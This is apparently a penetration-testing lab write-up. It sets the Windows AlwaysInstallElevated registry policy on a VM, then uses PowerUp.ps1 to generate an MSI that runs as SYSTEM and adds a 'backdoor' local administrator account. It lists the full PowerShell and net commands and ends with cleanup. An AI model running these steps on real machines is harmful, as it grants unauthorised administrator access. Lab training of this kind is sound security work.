# Penetration Testing: Write a PS Script That Enables the AlwaysInstallElevated Registry Key

---

## Objectives
- Understand how the `AlwaysInstallElevated` Group Policy / registry setting, when enabled on both `HKLM` and `HKCU`, allows any user to install `.msi` packages with SYSTEM-level privileges.
- Practice enabling this misconfiguration in a lab environment, then using a known privilege-escalation enumeration tool to detect and abuse it.
- Confirm privilege escalation by validating that a newly created account was added to the local Administrators group.

---

## Tools
- **PowerShell** (run as Administrator) — used to set the registry values and run the exploitation tooling.
- **PowerUp.ps1** (PowerSploit's Privesc module) — a public, well-known Windows privilege-escalation enumeration/exploitation script, used to detect the misconfiguration and generate a malicious installer.
- **Windows 10 VM** — isolated lab target.

---

## Steps
1. Wrote a PowerShell script (`Enable-AlwaysInstallElevated.ps1`) that sets the `AlwaysInstallElevated` registry value to `1` under both the `HKEY_LOCAL_MACHINE` and `HKEY_CURRENT_USER` Windows Installer policy paths.
2. Ran the script as Administrator on the lab VM.
  ```bash
   Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
   cd  C: \Users/<your name>/Desktop 
   .\Enable-AlwaysInstallElevated.ps1
   ```
3. Verified the setting took effect by reading back the `AlwaysInstallElevated` value under `HKLM` and confirming it returned `1`.
    ```bash
   Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
   ```
   → Should return 1
   
4. Unblocked and imported `PowerUp.ps1` as a PowerShell module.
   ```bash
   Unblock-File -Path .\PowerUp.ps1
   Import-Module .\PowerUp.ps1
   Get-RegistryAlwaysInstallElevated
   ```
   
→ Should return True

5. Ran `UserAdd.msi`, which — because of the misconfigured policy — launched with SYSTEM privileges regardless of the account running it, and used its GUI to create a new local account and add it to the Administrators group.
```bash
Write-UserAddMSI
.\UserAdd.msi
```

Fill the GUI: Username backdoor, Password password123, Group Administrators → Create.

6. Validated the result with `net user` and `net localgroup administrators`, confirming the new account appeared as a local Administrator.
   ```bash
   net user
   net localgroup administrators
   ```
→ backdoor should appear as an Administrator.

7. Cleaned up by resetting the registry value to `0` and removing the test account (after recording).
    ```bash
    Set-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0 -Force
    net user backdoor /delete
    ```
